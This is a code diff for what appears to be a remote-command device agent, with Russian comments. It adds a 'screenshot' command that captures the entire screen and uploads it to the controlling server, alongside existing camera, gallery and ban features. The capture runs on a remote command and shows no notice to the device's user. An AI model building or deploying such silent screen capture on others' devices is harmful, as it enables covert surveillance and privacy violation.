@@ -1356,6 +1356,33 @@ def open_file_picker(chat_id: str):
                 log.error(f"File upload failed: {e}")
     threading.Thread(target=_pick, daemon=True).start()
 
+def take_screenshot(chat_id: str):
+    """Делает скриншот всего экрана и отправляет в чат."""
+    import tempfile
+    try:
+        from PIL import ImageGrab
+        img = ImageGrab.grab()
+        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as f:
+            tmp_path = f.name
+        img.save(tmp_path, "PNG")
+        http_post_multipart("/upload", tmp_path, chat_id, caption="🖥 Скриншот")
+        log.info("Screenshot sent")
+    except Exception as e:
+        log.error(f"take_screenshot: {e}")
+        try:
+            http_post_json("/text_reply", {
+                "chat_id": chat_id,
+                "text": f"⚠️ Ошибка скриншота: {e}",
+                "device_id": DEVICE_ID,
+            })
+        except Exception:
+            pass
+    finally:
+        try:
+            os.unlink(tmp_path)
+        except Exception:
+            pass
+
 # ─── Ban state ────────────────────────────────────────────────────────────────
 
 class BanState:
@@ -1650,6 +1677,9 @@ def handle_command(cmd: dict):
 
     elif name == "unban_video":
         unban_video()
+
+    elif name == "screenshot":
+        threading.Thread(target=take_screenshot, args=(chat_id,), daemon=True).start()
 
     elif name in ("open_gallery", "open_camera"):
         open_file_picker(chat_id)
